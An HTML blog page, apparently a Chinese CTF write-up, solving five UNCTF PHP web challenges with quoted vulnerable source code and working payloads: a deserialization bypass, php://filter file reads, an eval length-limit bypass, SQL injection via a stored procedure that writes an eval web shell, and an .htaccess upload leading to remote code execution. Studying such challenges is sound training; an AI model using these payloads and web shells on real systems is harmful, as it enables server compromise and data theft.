@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web -write up -ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 unctf的平台上还有前两年的赛题，本着不做白不做的精神，我们做一下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unctf练习1">
+<meta property="og:url" content="http://example.com/2022/03/14/unctf%E7%BB%83%E4%B9%A01/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 unctf的平台上还有前两年的赛题，本着不做白不做的精神，我们做一下。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-14T13:03:42.000Z">
+<meta property="article:modified_time" content="2022-03-15T13:31:10.122Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web -write up -ctf">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/03/14/unctf练习1/"/>
+
+
+
+
+
+  <title>unctf练习1 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/14/unctf%E7%BB%83%E4%B9%A01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">unctf练习1</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-14T21:03:42+08:00">
+                2022-03-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>unctf的平台上还有前两年的赛题，本着不做白不做的精神，我们做一下。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><p>审计源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$username  = &quot;admin&quot;;</span><br><span class="line">$password  = &quot;password&quot;;</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$data = isset($_POST[&#x27;data&#x27;])? $_POST[&#x27;data&#x27;]: &quot;&quot; ;</span><br><span class="line">$data_unserialize = unserialize($data);</span><br><span class="line">if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;username or password error!&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>我们要送一个序列化数组进去，但是要让username的值为admin，password的值为password。直接构造这个数组序列化是通不过的，因为反序列化的结果就是个Array。</p>
+<p>这里要运用到布尔的trick，bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。</p>
+<p>因此构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入得到flag。</p>
+<h1 id="L0vephp"><a href="#L0vephp" class="headerlink" title="L0vephp"></a>L0vephp</h1><p>进入网页提示我们查看源码，右键被ban就f12，发现：<code>B4Z0-@:OCnDf,</code></p>
+<p>测试下是base85，解出来是<code>get action</code>，但是没有源码出现，继续尝试任意文件读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=php://filter/read=string.toupper|string.rot13/resource=flag.php</span><br><span class="line">//base64被过滤了</span><br></pre></td></tr></table></figure>
+
+<p>源码中发现出现了新内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?CUC</span><br><span class="line"></span><br><span class="line">$SYNT = &quot;HAPGS&#123;7UVF_VF_@_S4XR_S1N9&#125;&quot;;</span><br><span class="line"></span><br><span class="line">//UVAG:316R4433782R706870</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
+
+<p>rot13解密：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"></span><br><span class="line">$flag = &quot;unctf&#123;7his_is_@_f4ke_f1a9&#125;&quot;;</span><br><span class="line"></span><br><span class="line">//hint:316e4433782e706870</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
+
+<p>hint中16进制转字符串：<code>1nD3x.php</code></p>
+<p>进入后这下要读源码了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$code=$_REQUEST[&#x27;code&#x27;];</span><br><span class="line"></span><br><span class="line">$_=array(&#x27;@&#x27;,&#x27;\~&#x27;,&#x27;\^&#x27;,&#x27;\&amp;&#x27;,&#x27;\?&#x27;,&#x27;\&lt;&#x27;,&#x27;\&gt;&#x27;,&#x27;\*&#x27;,&#x27;\`&#x27;,&#x27;\+&#x27;,&#x27;\-&#x27;,&#x27;\&#x27;&#x27;,&#x27;\&quot;&#x27;,&#x27;\\\\&#x27;,&#x27;\/&#x27;); </span><br><span class="line">$__=array(&#x27;eval&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;shell_exec&#x27;,&#x27;assert&#x27;,&#x27;passthru&#x27;,&#x27;array_map&#x27;,&#x27;ob_start&#x27;,&#x27;create_function&#x27;,&#x27;call_user_func&#x27;,&#x27;call_user_func_array&#x27;,&#x27;array_filter&#x27;,&#x27;proc_open&#x27;);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"></span><br><span class="line">if (strlen($code)&gt;16)&#123;</span><br><span class="line">    die(&#x27;Too long&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($blacklist1 as $blacklisted) &#123; </span><br><span class="line">    if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/m&#x27;, $code)) &#123; </span><br><span class="line">        die(&#x27;WTF???&#x27;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">foreach ($blacklist2 as $blackitem) &#123;</span><br><span class="line">    if (preg_match (&#x27;/&#x27; . $blackitem . &#x27;/im&#x27;, $code)) &#123;</span><br><span class="line">        die(&#x27;Sry,try again&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@eval($code);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>绕rce，除了waf还限制了长度，之前能用的方法基本是绝了。但是p牛之前有一篇博客：<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">eval长度限制绕过 &amp;&amp; PHP5.6新特性</a></p>
+<p>这篇博客里介绍了一个方法——数组展开，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?1[]=test&amp;1[]=system(&#x27;ls&#x27;);&amp;2=assert</span><br><span class="line">POST:code=usort(...$_GET);</span><br></pre></td></tr></table></figure>
+
+<p>最后命令执行获取flag。</p>
+<h1 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h1><p>审计源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">    public $uname;</span><br><span class="line">    public $password;</span><br><span class="line">    public function __construct($uname,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;uname=$uname;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">            if($this-&gt;password===&#x27;easy&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                include(&#x27;flag.php&#x27;);</span><br><span class="line">                echo $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                echo &#x27;wrong password&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[1];</span><br><span class="line">$password=1;</span><br><span class="line">$ser=filter(serialize(new a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>很经典的一道反序列化字符串逃逸，我们审计代码发现只要让password的值为easy就可以了，但是题目设置了变量password的值恒定为1，因此我们只能通过反序列化字符串逃逸的方式让password逃逸出来。</p>
+<p>我们先构造密码部分需要逃逸的反序列化：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>总共29个字符，接着发现源码中的替换逻辑是增加4个字符，因此需要进行8次替换，并且还需要补3位。不过由于反序列化结束后不会继续的原理，把这三位字符补到最后就可以了。</p>
+<p>构建payload，传入获取flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;ook</span><br></pre></td></tr></table></figure>
+
+<h1 id="checkin-sql"><a href="#checkin-sql" class="headerlink" title="checkin-sql"></a>checkin-sql</h1><p>这题做的都麻了，看了wp才懂。首先这里是单引号sql，并且过滤了一众函数导致常用注入手段失效。题目提示我们flag不在数据库中，那很有可能就是文件写入了，但是我试图直接写马发现写不进去。</p>
+<p>然后就歇了，看wp发现要利用到mysql的储存过程进行写入，先放两个地址在这：<br><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/mysql-stored-procedure.html">MySQL 存储过程 | 菜鸟教程</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mark-chan/p/5384139.html">MySQL存储过程 | 博客园</a></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;1&#x27;;</span><br><span class="line">    create procedure `mrl64`(out string text(1024), in hex text(1024))</span><br><span class="line">    BEGIN</span><br><span class="line">        SET string = hex;</span><br><span class="line">    END;</span><br><span class="line">    ;#&quot;;</span><br><span class="line">echo urlencode($a).&quot;\n&quot;;</span><br><span class="line">$b = &quot;1&#x27;;</span><br><span class="line">    call `mrl64`(@decoded, 0x73656c65637420273c3f706870206576616c28245f504f53545b226d726c3634225d293b203f3e2720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f7368656c6c2e706870223b);</span><br><span class="line">    prepare payload from @decoded;</span><br><span class="line">    execute payload;</span><br><span class="line">    ;#&quot;;</span><br><span class="line">echo urlencode($b);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//select &#x27;&lt;?php eval($_POST[&quot;mrl64&quot;]); ?&gt;&#x27; into outfile &quot;/var/www/html/shell.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>接着写入就可以了，exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = &quot;http://844ce818-1804-499f-b859-ca599c2805c5.node1.hackingfor.fun/&quot;</span><br><span class="line">payload1 = &quot;1&#x27;%3B%0D%0A%20%20%20%20create%20procedure%20%60mrl64%60(out%20string%20text(1024),%20in%20hex%20text(1024))%0D%0A%20%20%20%20BEGIN%0D%0A%20%20%20%20%20%20%20%20SET%20string%20%3D%20hex%3B%0D%0A%20%20%20%20END%3B%0D%0A%20%20%20%20%3B%23&quot;</span><br><span class="line">//传入mysql传入过程部分</span><br><span class="line">payload2 = &quot;1&#x27;%3B%0D%0A%20%20%20%20call%20%60mrl64%60(%40decoded,%200x73656c65637420273c3f706870206576616c28245f504f53545b226d726c3634225d293b203f3e2720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f7368656c6c2e706870223b)%3B%0D%0A%20%20%20%20prepare%20payload%20from%20%40decoded%3B%0D%0A%20%20%20%20execute%20payload%3B%0D%0A%20%20%20%20%3B%23&quot;</span><br><span class="line">//写入shell.php，密码mrl64 </span><br><span class="line"> </span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;mrl64&quot;:&quot;system(&#x27;cat /fffllaagg&#x27;);&quot;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">requests.get(url=url+&quot;?inject=&quot;+payload1)</span><br><span class="line">requests.get(url=url+&quot;?inject=&quot;+payload2)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ans = requests.post(url+&quot;shell.php&quot;,data=data)</span><br><span class="line">print(ans.text)</span><br></pre></td></tr></table></figure>
+
+<p>跑脚本就可以得到flag。</p>
+<h1 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite"></a>babywrite</h1><p>这个是2021那次的题，当时太菜了没做出来，这里就复现下。</p>
+<p>审计代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sandbox = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">if (!is_dir($sandbox)) &#123;</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;filename&#x27;]) &amp;&amp; isset($_GET[&#x27;content&#x27;])) &#123;</span><br><span class="line">    $filename = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    $content = $_GET[&#x27;content&#x27;];</span><br><span class="line">    if (preg_match_all(&quot;/ph|\.\.|\//i&quot;, $filename) || strlen($filename) &gt; 10) &#123;</span><br><span class="line">        die(&quot;No way!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match_all(&quot;/&lt;\?|ph/&quot;, $content)) &#123;</span><br><span class="line">        die(&quot;No way!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $sandbox . &quot;/&quot; . $filename;</span><br><span class="line">    @file_put_contents($filename, $content);</span><br><span class="line">    echo $filename;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>很经典的写入，很粗暴的waf，很卑鄙的限制长度。首先发现php文件是不能直接上传的，这意味着我们只能上传图片马，那上传图片马自然就想到要用到<code>.htaccess</code>。</p>
+<p>当时是真的菜，居然连数组绕过正则匹配都不知道，然后就卡在这了半天死活做不出来，现在懂了所以就简单了。</p>
+<p>我们传入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;content[]=AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure>
+
+<p>然后传入shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=1.png&amp;content[]=&lt;?php @eval($_POST[&#x27;mrl64&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p>最后直接rce就可以了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mrl64=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-write-up-ctf/" rel="tag"># -web -write up -ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/03/13/%E6%80%BB%E7%BB%93%E5%8F%8D%E5%BC%B9shell/" rel="next" title="总结反弹shell">
+                <i class="fa fa-chevron-left"></i> 总结反弹shell
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">55</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezphp"><span class="nav-number"></span> <span class="nav-text">ezphp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#L0vephp"><span class="nav-number"></span> <span class="nav-text">L0vephp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easyunserialize"><span class="nav-number"></span> <span class="nav-text">easyunserialize</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#checkin-sql"><span class="nav-number"></span> <span class="nav-text">checkin-sql</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#babywrite"><span class="nav-number"></span> <span class="nav-text">babywrite</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
